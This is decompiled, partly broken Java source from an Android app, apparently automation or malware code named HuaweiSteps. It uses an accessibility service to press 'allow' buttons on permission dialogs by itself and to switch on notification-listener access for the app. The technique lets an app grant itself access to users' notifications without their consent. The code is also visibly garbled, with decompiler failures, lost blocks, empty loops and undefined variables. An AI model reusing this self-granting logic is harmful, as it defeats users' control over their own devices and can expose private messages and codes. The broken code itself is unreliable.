    /* JADX WARN: Code restructure failed: missing block: B:70:0x019e, code lost:
    
        if (r5 == false) goto L72;
     */
    /* JADX WARN: Code restructure failed: missing block: B:71:0x01a0, code lost:
    
        p000.t60.m214704c5("HuaweiSteps", "[华为点击] 直接点击成功");
     */
    /* JADX WARN: Code restructure failed: missing block: B:72:0x01a6, code lost:
    
        r0 = r0.getParent();
        r5 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:73:0x01ab, code lost:
    
        if (r0 == null) goto L122;
     */
    /* JADX WARN: Code restructure failed: missing block: B:75:0x01ae, code lost:
    
        if (r5 >= 5) goto L123;
     */
    /* JADX WARN: Code restructure failed: missing block: B:76:0x01b0, code lost:
    
        r5 = r5 + 1;
        p000.t60.m214704c5("HuaweiSteps", "[华为点击] 检查父节点(" + r5 + "层), isClickable=" + r0.isClickable());
     */
    /* JADX WARN: Code restructure failed: missing block: B:77:0x01d3, code lost:
    
        if (r0.isClickable() == false) goto L124;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x01d5, code lost:
    
        r7 = r0.performAction(16);
        p000.t60.m214704c5("HuaweiSteps", "[华为点击] 父节点点击结果: " + r7);
     */
    /* JADX WARN: Code restructure failed: missing block: B:79:0x01ea, code lost:
    
        if (r7 == false) goto L125;
     */
    /* JADX WARN: Code restructure failed: missing block: B:80:0x01ec, code lost:
    
        p000.tz0.m214806a6("[华为点击] 父节点(", r5, "层)点击成功", "HuaweiSteps");
     */
    /* JADX WARN: Code restructure failed: missing block: B:81:0x01f3, code lost:
    
        r0 = r26 + 1;
        p000.tz0.m214806a6("[华为权限] 第", r0, "次点击", "HuaweiSteps");
        r2.f54039a0 = r1;
        r2.f54040a1 = r0;
        r2.f54041a2 = 0;
        r2.f54042a3 = r10;
        r2.f54043a4 = r14;
        r2.f54046a7 = 4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:82:0x0210, code lost:
    
        if (p000.b81.m210571b1(100, r2) != r3) goto L84;
     */
    /* JADX WARN: Code restructure failed: missing block: B:84:0x0214, code lost:
    
        r4 = r14;
        r14 = r0;
        r15 = r1;
        r0 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:86:0x021c, code lost:
    
        r0 = r0.getParent();
     */
    /* JADX WARN: Code restructure failed: missing block: B:87:0x0223, code lost:
    
        p000.tz0.m214809a9("[华为点击] 按钮点击失败: '", r4, "'", "HuaweiSteps");
        r7 = r20;
        r0 = r21;
        r4 = r22;
        r6 = r23;
        r9 = r24;
        r13 = r25;
        r5 = r26;
     */
    /* JADX WARN: Code restructure failed: missing block: B:88:0x023c, code lost:
    
        r0 = r21;
        r4 = r22;
        r6 = r23;
     */
    /* JADX WARN: Code restructure failed: missing block: B:90:0x0262, code lost:
    
        r0 = r7 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:91:0x0265, code lost:
    
        if (r0 < 5) goto L95;
     */
    /* JADX WARN: Code restructure failed: missing block: B:92:0x0267, code lost:
    
        if (r26 <= 0) goto L95;
     */
    /* JADX WARN: Code restructure failed: missing block: B:93:0x0269, code lost:
    
        r5 = r26;
        p000.tz0.m214806a6("[华为权限] 权限完成，共点击 ", r5, " 次", "HuaweiSteps");
     */
    /* JADX WARN: Code restructure failed: missing block: B:95:0x0272, code lost:
    
        r7 = r14;
        r14 = r26;
        r5 = r1;
     */
    /* JADX WARN: Removed duplicated region for block: B:109:0x0270 A[EDGE_INSN: B:109:0x0270->B:94:0x0270 BREAK  A[LOOP:0: B:30:0x00b4->B:41:0x00f1], SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:32:0x00c0  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:99:0x028e -> B:100:0x0292). Please report as a decompilation issue!!! */
    /* renamed from: b6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212169b6(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$executeHuaweiBasicPermissions$1 huaweiSteps$executeHuaweiBasicPermissions$1;
        C0365a2 c0365a2;
        long jCurrentTimeMillis;
        long j;
        C0365a2 c0365a22;
        int i;
        int i2;
        long j2;
        long j3;
        long j4;
        if (continuationImpl instanceof HuaweiSteps$executeHuaweiBasicPermissions$1) {
            huaweiSteps$executeHuaweiBasicPermissions$1 = (HuaweiSteps$executeHuaweiBasicPermissions$1) continuationImpl;
            int i3 = huaweiSteps$executeHuaweiBasicPermissions$1.f54046a7;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeHuaweiBasicPermissions$1.f54046a7 = i3 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeHuaweiBasicPermissions$1 = new HuaweiSteps$executeHuaweiBasicPermissions$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$executeHuaweiBasicPermissions$1.f54044a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = huaweiSteps$executeHuaweiBasicPermissions$1.f54046a7;
        int i5 = 3;
        boolean z = true;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            t60.m214704c5("HuaweiSteps", "[华为基础权限] 开始（超时10秒）");
            huaweiSteps$executeHuaweiBasicPermissions$1.f54039a0 = this;
            huaweiSteps$executeHuaweiBasicPermissions$1.f54046a7 = 1;
            if (m212183d7(huaweiSteps$executeHuaweiBasicPermissions$1) != coroutineSingletons) {
                c0365a2 = this;
            }
            return coroutineSingletons;
        }
        if (i4 != 1) {
            if (i4 == 2) {
                c0365a2 = huaweiSteps$executeHuaweiBasicPermissions$1.f54039a0;
                kg1.m213544f4(obj);
                jCurrentTimeMillis = System.currentTimeMillis();
                j = 10000;
                c0365a22 = c0365a2;
                i = 0;
                i2 = 0;
                while (true) {
                    if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                    }
                }
                t60.m214704c5("HuaweiSteps", "[华为基础权限] 完成，用时" + ((System.currentTimeMillis() - jCurrentTimeMillis) / 1000) + "秒，点击 " + i + " 次");
                return C1351vv.f60710b1;
            }
            if (i4 == 3) {
                long j5 = huaweiSteps$executeHuaweiBasicPermissions$1.f54043a4;
                jCurrentTimeMillis = huaweiSteps$executeHuaweiBasicPermissions$1.f54042a3;
                i2 = huaweiSteps$executeHuaweiBasicPermissions$1.f54041a2;
                int i6 = huaweiSteps$executeHuaweiBasicPermissions$1.f54040a1;
                C0365a2 c0365a23 = huaweiSteps$executeHuaweiBasicPermissions$1.f54039a0;
                kg1.m213544f4(obj);
                c0365a22 = c0365a23;
                i = i6;
                j = j5;
                while (true) {
                    if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                    }
                }
                t60.m214704c5("HuaweiSteps", "[华为基础权限] 完成，用时" + ((System.currentTimeMillis() - jCurrentTimeMillis) / 1000) + "秒，点击 " + i + " 次");
                return C1351vv.f60710b1;
            }
            if (i4 == 4) {
                long j6 = huaweiSteps$executeHuaweiBasicPermissions$1.f54043a4;
                jCurrentTimeMillis = huaweiSteps$executeHuaweiBasicPermissions$1.f54042a3;
                int i7 = huaweiSteps$executeHuaweiBasicPermissions$1.f54041a2;
                int i8 = huaweiSteps$executeHuaweiBasicPermissions$1.f54040a1;
                C0365a2 c0365a24 = huaweiSteps$executeHuaweiBasicPermissions$1.f54039a0;
                kg1.m213544f4(obj);
                int i9 = i7;
                long j7 = j6;
                C0365a2 c0365a25 = c0365a24;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54039a0 = c0365a25;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54040a1 = i8;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54041a2 = i9;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54042a3 = jCurrentTimeMillis;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54043a4 = j7;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54046a7 = 5;
                j2 = jCurrentTimeMillis;
                j3 = 100;
                if (b81.m210571b1(100L, huaweiSteps$executeHuaweiBasicPermissions$1) != coroutineSingletons) {
                    c0365a22 = c0365a25;
                    i = i8;
                    j4 = j7;
                    i2 = i9;
                    jCurrentTimeMillis = j2;
                    i5 = 3;
                    j = j4;
                    z = true;
                    while (true) {
                        if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                        }
                    }
                    t60.m214704c5("HuaweiSteps", "[华为基础权限] 完成，用时" + ((System.currentTimeMillis() - jCurrentTimeMillis) / 1000) + "秒，点击 " + i + " 次");
                    return C1351vv.f60710b1;
                }
                return coroutineSingletons;
            }
            if (i4 != 5) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            long j8 = huaweiSteps$executeHuaweiBasicPermissions$1.f54043a4;
            long j9 = huaweiSteps$executeHuaweiBasicPermissions$1.f54042a3;
            i2 = huaweiSteps$executeHuaweiBasicPermissions$1.f54041a2;
            int i10 = huaweiSteps$executeHuaweiBasicPermissions$1.f54040a1;
            C0365a2 c0365a26 = huaweiSteps$executeHuaweiBasicPermissions$1.f54039a0;
            kg1.m213544f4(obj);
            c0365a22 = c0365a26;
            j4 = j8;
            i = i10;
            j2 = j9;
            j3 = 100;
            jCurrentTimeMillis = j2;
            i5 = 3;
            j = j4;
            z = true;
            while (true) {
                if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                    break;
                }
                if (!c0365a22.m212187e1()) {
                    break;
                }
                t60.m214704c5("HuaweiSteps", "[华为权限] 检测到通知权限弹窗，直接点击允许");
                if (!c0365a22.m212160a3("始终允许", z)) {
                    c0365a22.m212160a3("允许", z);
                }
                int i11 = i + 1;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54039a0 = c0365a22;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54040a1 = i11;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54041a2 = i2;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54042a3 = jCurrentTimeMillis;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54043a4 = j;
                huaweiSteps$executeHuaweiBasicPermissions$1.f54046a7 = i5;
                if (b81.m210571b1(300L, huaweiSteps$executeHuaweiBasicPermissions$1) == coroutineSingletons) {
                    break;
                }
                i = i11;
            }
            t60.m214704c5("HuaweiSteps", "[华为基础权限] 完成，用时" + ((System.currentTimeMillis() - jCurrentTimeMillis) / 1000) + "秒，点击 " + i + " 次");
            return C1351vv.f60710b1;
        }
        c0365a2 = huaweiSteps$executeHuaweiBasicPermissions$1.f54039a0;
        kg1.m213544f4(obj);
        c0365a2.m212194f1();
        huaweiSteps$executeHuaweiBasicPermissions$1.f54039a0 = c0365a2;
        huaweiSteps$executeHuaweiBasicPermissions$1.f54046a7 = 2;
        int i12 = i12 + 1;
        i2 = i2;
        String[] permission_allow_texts = permission_allow_texts;
        int length = length;
        AccessibilityNodeInfo rootInActiveWindow = rootInActiveWindow;
        i = i;
    }

    /* JADX WARN: Code restructure failed: missing block: B:126:0x022c, code lost:
    
        if (p000.b81.m210571b1(300, r3) == r4) goto L135;
     */
    /* JADX WARN: Code restructure failed: missing block: B:134:0x0253, code lost:
    
        if (p000.b81.m210571b1(100, r3) == r4) goto L135;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x00c9, code lost:
    
        if (p000.b81.m210571b1(r10, r3) == r4) goto L135;
     */
    /* JADX WARN: Path cross not found for [B:101:0x01cf, B:102:0x01d1], limit reached: 218 */
    /* JADX WARN: Path cross not found for [B:110:0x01ec, B:99:0x01c9], limit reached: 218 */
    /* JADX WARN: Path cross not found for [B:84:0x019c, B:85:0x019e], limit reached: 218 */
    /* JADX WARN: Path cross not found for [B:93:0x01b9, B:82:0x0196], limit reached: 218 */
    /* JADX WARN: Removed duplicated region for block: B:109:0x01ea  */
    /* JADX WARN: Removed duplicated region for block: B:130:0x0234  */
    /* JADX WARN: Removed duplicated region for block: B:180:0x02fa  */
    /* JADX WARN: Removed duplicated region for block: B:182:0x020e A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:188:0x00d2 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:190:0x012d A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:202:0x02b4 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:209:0x0123 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:215:0x01bc A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:216:0x01ef A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:42:0x00a2  */
    /* JADX WARN: Removed duplicated region for block: B:68:0x0125 A[Catch: Exception -> 0x0106, TRY_LEAVE, TryCatch #3 {Exception -> 0x0106, blocks: (B:48:0x00d2, B:50:0x00da, B:52:0x00e2, B:55:0x00e9, B:56:0x00ed, B:58:0x00f3, B:60:0x00ff, B:63:0x010a, B:66:0x011f, B:68:0x0125, B:78:0x0186, B:80:0x018e, B:82:0x0196, B:95:0x01bc, B:97:0x01c3, B:99:0x01c9, B:112:0x01ef, B:102:0x01d1, B:103:0x01d5, B:105:0x01db, B:85:0x019e, B:86:0x01a2, B:88:0x01a8, B:113:0x01f5, B:120:0x0214, B:125:0x0228), top: B:188:0x00d2 }] */
    /* JADX WARN: Removed duplicated region for block: B:78:0x0186 A[Catch: Exception -> 0x0106, TRY_ENTER, TryCatch #3 {Exception -> 0x0106, blocks: (B:48:0x00d2, B:50:0x00da, B:52:0x00e2, B:55:0x00e9, B:56:0x00ed, B:58:0x00f3, B:60:0x00ff, B:63:0x010a, B:66:0x011f, B:68:0x0125, B:78:0x0186, B:80:0x018e, B:82:0x0196, B:95:0x01bc, B:97:0x01c3, B:99:0x01c9, B:112:0x01ef, B:102:0x01d1, B:103:0x01d5, B:105:0x01db, B:85:0x019e, B:86:0x01a2, B:88:0x01a8, B:113:0x01f5, B:120:0x0214, B:125:0x0228), top: B:188:0x00d2 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x01b7  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x01c3 A[Catch: Exception -> 0x0106, TryCatch #3 {Exception -> 0x0106, blocks: (B:48:0x00d2, B:50:0x00da, B:52:0x00e2, B:55:0x00e9, B:56:0x00ed, B:58:0x00f3, B:60:0x00ff, B:63:0x010a, B:66:0x011f, B:68:0x0125, B:78:0x0186, B:80:0x018e, B:82:0x0196, B:95:0x01bc, B:97:0x01c3, B:99:0x01c9, B:112:0x01ef, B:102:0x01d1, B:103:0x01d5, B:105:0x01db, B:85:0x019e, B:86:0x01a2, B:88:0x01a8, B:113:0x01f5, B:120:0x0214, B:125:0x0228), top: B:188:0x00d2 }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:134:0x0253 -> B:136:0x0256). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:16:0x0044 -> B:178:0x02e7). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:177:0x02e5 -> B:178:0x02e7). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:69:0x012a -> B:179:0x02f1). Please report as a decompilation issue!!! */
    /* renamed from: b7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212170b7(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$executeNotificationListenerPermission$1 huaweiSteps$executeNotificationListenerPermission$1;
        C0365a2 c0365a2;
        int i;
        int i2;
        int i3;
        boolean z;
        boolean z2;
        boolean z3;
        boolean z4;
        int i4;
        int i5;
        int i6;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        int i7;
        AccessibilityNodeInfo parent;
        boolean z5;
        boolean z6;
        String string;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof HuaweiSteps$executeNotificationListenerPermission$1) {
            huaweiSteps$executeNotificationListenerPermission$1 = (HuaweiSteps$executeNotificationListenerPermission$1) continuationImpl;
            int i8 = huaweiSteps$executeNotificationListenerPermission$1.f54053a6;
            if ((i8 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = i8 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeNotificationListenerPermission$1 = new HuaweiSteps$executeNotificationListenerPermission$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$executeNotificationListenerPermission$1.f54051a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i9 = huaweiSteps$executeNotificationListenerPermission$1.f54053a6;
        int i10 = 11;
        int i11 = 3;
        long j = 300;
        try {
        } catch (Exception e) {
            e = e;
        }
        switch (i9) {
            case 0:
                kg1.m213544f4(obj);
                t60.m214704c5("HuaweiSteps", "[通知使用权] 开启通知使用权");
                if (m212193f0(this.f55074b2)) {
                    t60.m214704c5("HuaweiSteps", "[通知使用权] 已标记完成，跳过");
                    return c1351vv;
                }
                c0365a2 = this;
                i7 = 1;
                if (i7 < i11) {
                    c0365a2.m212195f2(c0365a2.f55074b2);
                    t60.m214704c5("HuaweiSteps", "[通知使用权] 流程结束（可能未成功）");
                    return c1351vv;
                }
                AbstractC0003a2.m44c5("[通知使用权] 第", i7, "次尝试", "HuaweiSteps");
                t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤1: 打开通知使用权设置页面");
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.setFlags(276824064);
                c0365a2.f55063a1.startActivity(intent);
                huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i7;
                huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 1;
                break;
            case 1:
                i7 = huaweiSteps$executeNotificationListenerPermission$1.f54048a1;
                c0365a2 = huaweiSteps$executeNotificationListenerPermission$1.f54047a0;
                kg1.m213544f4(obj);
                i = i7;
                i5 = 1;
                i6 = 0;
                while (true) {
                    if (i5 >= i10) {
                        try {
                        } catch (Exception e2) {
                            e = e2;
                            i9 = i;
                            tz0.m214807a7("[通知使用权] 异常: ", e.getMessage(), "HuaweiSteps");
                            i = i9;
                            i7 = i + 1;
                            i10 = 11;
                            i11 = 3;
                            j = 300;
                            if (i7 < i11) {
                            }
                        }
                        AccessibilityNodeInfo rootInActiveWindow = c0365a2.f55063a1.getRootInActiveWindow();
                        if (rootInActiveWindow != null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("通知使用权")) != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                            Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                            while (it.hasNext()) {
                                if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                                    t60.m214704c5("HuaweiSteps", "[通知使用权] 页面已加载");
                                    i6 = 1;
                                }
                            }
                        }
                        huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                        huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i;
                        huaweiSteps$executeNotificationListenerPermission$1.f54049a2 = i6;
                        huaweiSteps$executeNotificationListenerPermission$1.f54050a3 = i5;
                        huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 2;
                        if (b81.m210571b1(100L, huaweiSteps$executeNotificationListenerPermission$1) != coroutineSingletons) {
                            i5++;
                        }
                    }
                }
                if (i6 == 0) {
                    try {
                    } catch (Exception e3) {
                        e = e3;
                        i9 = i;
                        tz0.m214807a7("[通知使用权] 异常: ", e.getMessage(), "HuaweiSteps");
                        i = i9;
                        i7 = i + 1;
                        i10 = 11;
                        i11 = 3;
                        j = 300;
                        if (i7 < i11) {
                        }
                    }
                    t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤3: 点击'" + c0365a2.m212178d1() + "'的开关");
                    c0365a2.m212208g6(c0365a2.m212178d1(), true);
                    t60.m214704c5("HuaweiSteps", "[通知使用权] 已尝试点击开关: " + c0365a2.m212178d1());
                    huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                    huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i;
                    huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = i11;
                    if (b81.m210571b1(300L, huaweiSteps$executeNotificationListenerPermission$1) != coroutineSingletons) {
                        i4 = i;
                        t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤4: 处理弹窗");
                        i = i4;
                        i2 = 1;
                        i3 = 0;
                        while (i2 < i10) {
                            AccessibilityNodeInfo rootInActiveWindow2 = c0365a2.f55063a1.getRootInActiveWindow();
                            if (rootInActiveWindow2 != null) {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow2.findAccessibilityNodeInfosByText("是否启用");
                                if (listFindAccessibilityNodeInfosByText2 != null) {
                                    if (!listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                        Iterator<T> it2 = listFindAccessibilityNodeInfosByText2.iterator();
                                        while (it2.hasNext()) {
                                            if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                                                z4 = true;
                                                z = !z4;
                                                if (z) {
                                                    t60.m214704c5("HuaweiSteps", "[通知使用权] 检测到'是否启用'弹窗");
                                                } else {
                                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow2.findAccessibilityNodeInfosByText("允许");
                                                    if (listFindAccessibilityNodeInfosByText3 != null) {
                                                        if (!listFindAccessibilityNodeInfosByText3.isEmpty()) {
                                                            Iterator<T> it3 = listFindAccessibilityNodeInfosByText3.iterator();
                                                            while (it3.hasNext()) {
                                                                if (((AccessibilityNodeInfo) it3.next()).isVisibleToUser()) {
                                                                    z3 = true;
                                                                    z2 = !z3;
                                                                    if (z2) {
                                                                        t60.m214704c5("HuaweiSteps", "[通知使用权] 检测到'允许'按钮");
                                                                    }
                                                                }
                                                            }
                                                        }
                                                        z3 = false;
                                                        if (!z3) {
                                                        }
                                                        if (z2) {
                                                        }
                                                    }
                                                    if (z2) {
                                                    }
                                                }
                                                i3 = 1;
                                                if (i3 == 0) {
                                                    try {
                                                    } catch (Exception e4) {
                                                        e = e4;
                                                        i9 = i;
                                                        tz0.m214807a7("[通知使用权] 异常: ", e.getMessage(), "HuaweiSteps");
                                                        i = i9;
                                                        i7 = i + 1;
                                                        i10 = 11;
                                                        i11 = 3;
                                                        j = 300;
                                                        if (i7 < i11) {
                                                        }
                                                    }
                                                    if (c0365a2.m212160a3("允许", true)) {
                                                        t60.m214704c5("HuaweiSteps", "[通知使用权] 点击: 允许");
                                                    } else {
                                                        t60.m214704c5("HuaweiSteps", "[通知使用权] 未找到'允许'按钮");
                                                    }
                                                    huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                                                    huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i;
                                                    huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 5;
                                                    break;
                                                } else {
                                                    t60.m214704c5("HuaweiSteps", "[通知使用权] 未检测到弹窗，可能已开启");
                                                }
                                                i9 = i;
                                                t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤5: 验证开启状态");
                                                c0365a2.f55063a1.performGlobalAction(1);
                                                huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                                                huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i9;
                                                huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 6;
                                                break;
                                            }
                                        }
                                    }
                                    z4 = false;
                                    if (!z4) {
                                    }
                                    if (z) {
                                    }
                                    i3 = 1;
                                    if (i3 == 0) {
                                    }
                                    i9 = i;
                                    t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤5: 验证开启状态");
                                    c0365a2.f55063a1.performGlobalAction(1);
                                    huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                                    huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i9;
                                    huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 6;
                                }
                                if (z) {
                                }
                                i3 = 1;
                                if (i3 == 0) {
                                }
                                i9 = i;
                                t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤5: 验证开启状态");
                                c0365a2.f55063a1.performGlobalAction(1);
                                huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                                huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i9;
                                huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 6;
                            }
                            huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                            huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i;
                            huaweiSteps$executeNotificationListenerPermission$1.f54049a2 = i3;
                            huaweiSteps$executeNotificationListenerPermission$1.f54050a3 = i2;
                            huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 4;
                            if (b81.m210571b1(100L, huaweiSteps$executeNotificationListenerPermission$1) != coroutineSingletons) {
                                i2++;
                            }
                        }
                        if (i3 == 0) {
                        }
                        i9 = i;
                        t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤5: 验证开启状态");
                        c0365a2.f55063a1.performGlobalAction(1);
                        huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                        huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i9;
                        huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 6;
                    }
                    return coroutineSingletons;
                }
                t60.m214704c5("HuaweiSteps", "[通知使用权] 页面未加载，重试");
                i7 = i + 1;
                i10 = 11;
                i11 = 3;
                j = 300;
                if (i7 < i11) {
                }
                break;
            case 2:
                int i12 = huaweiSteps$executeNotificationListenerPermission$1.f54050a3;
                int i13 = huaweiSteps$executeNotificationListenerPermission$1.f54049a2;
                int i14 = huaweiSteps$executeNotificationListenerPermission$1.f54048a1;
                c0365a2 = huaweiSteps$executeNotificationListenerPermission$1.f54047a0;
                try {
                    kg1.m213544f4(obj);
                    i6 = i13;
                    i = i14;
                    i5 = i12 + 1;
                } catch (Exception e5) {
                    e = e5;
                    i9 = i14;
                    tz0.m214807a7("[通知使用权] 异常: ", e.getMessage(), "HuaweiSteps");
                    i = i9;
                    i7 = i + 1;
                    i10 = 11;
                    i11 = 3;
                    j = 300;
                    if (i7 < i11) {
                    }
                }
                while (true) {
                    if (i5 >= i10) {
                    }
                    i5++;
                }
                if (i6 == 0) {
                }
                break;
            case 3:
                i4 = huaweiSteps$executeNotificationListenerPermission$1.f54048a1;
                c0365a2 = huaweiSteps$executeNotificationListenerPermission$1.f54047a0;
                kg1.m213544f4(obj);
                t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤4: 处理弹窗");
                i = i4;
                i2 = 1;
                i3 = 0;
                while (i2 < i10) {
                }
                if (i3 == 0) {
                }
                i9 = i;
                t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤5: 验证开启状态");
                c0365a2.f55063a1.performGlobalAction(1);
                huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i9;
                huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 6;
                break;
            case 4:
                int i15 = huaweiSteps$executeNotificationListenerPermission$1.f54050a3;
                int i16 = huaweiSteps$executeNotificationListenerPermission$1.f54049a2;
                int i17 = huaweiSteps$executeNotificationListenerPermission$1.f54048a1;
                C0365a2 c0365a22 = huaweiSteps$executeNotificationListenerPermission$1.f54047a0;
                try {
                    kg1.m213544f4(obj);
                    i3 = i16;
                    c0365a2 = c0365a22;
                    i = i17;
                    i2 = i15 + 1;
                } catch (Exception e6) {
                    e = e6;
                    c0365a2 = c0365a22;
                    i9 = i17;
                    tz0.m214807a7("[通知使用权] 异常: ", e.getMessage(), "HuaweiSteps");
                    i = i9;
                    i7 = i + 1;
                    i10 = 11;
                    i11 = 3;
                    j = 300;
                    if (i7 < i11) {
                    }
                }
                while (i2 < i10) {
                }
                if (i3 == 0) {
                }
                i9 = i;
                t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤5: 验证开启状态");
                c0365a2.f55063a1.performGlobalAction(1);
                huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i9;
                huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 6;
                break;
            case 5:
                i9 = huaweiSteps$executeNotificationListenerPermission$1.f54048a1;
                c0365a2 = huaweiSteps$executeNotificationListenerPermission$1.f54047a0;
                kg1.m213544f4(obj);
                t60.m214704c5("HuaweiSteps", "[通知使用权] 步骤5: 验证开启状态");
                c0365a2.f55063a1.performGlobalAction(1);
                huaweiSteps$executeNotificationListenerPermission$1.f54047a0 = c0365a2;
                huaweiSteps$executeNotificationListenerPermission$1.f54048a1 = i9;
                huaweiSteps$executeNotificationListenerPermission$1.f54053a6 = 6;
                break;
            case 6:
                i9 = huaweiSteps$executeNotificationListenerPermission$1.f54048a1;
                c0365a2 = huaweiSteps$executeNotificationListenerPermission$1.f54047a0;
                kg1.m213544f4(obj);
                AccessibilityNodeInfo rootInActiveWindow3 = c0365a2.f55063a1.getRootInActiveWindow();
                if (rootInActiveWindow3 != null) {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText4 = rootInActiveWindow3.findAccessibilityNodeInfosByText(c0365a2.m212178d1());
                    if (listFindAccessibilityNodeInfosByText4 == null) {
                        listFindAccessibilityNodeInfosByText4 = EmptyList.f57568a0;
                    }
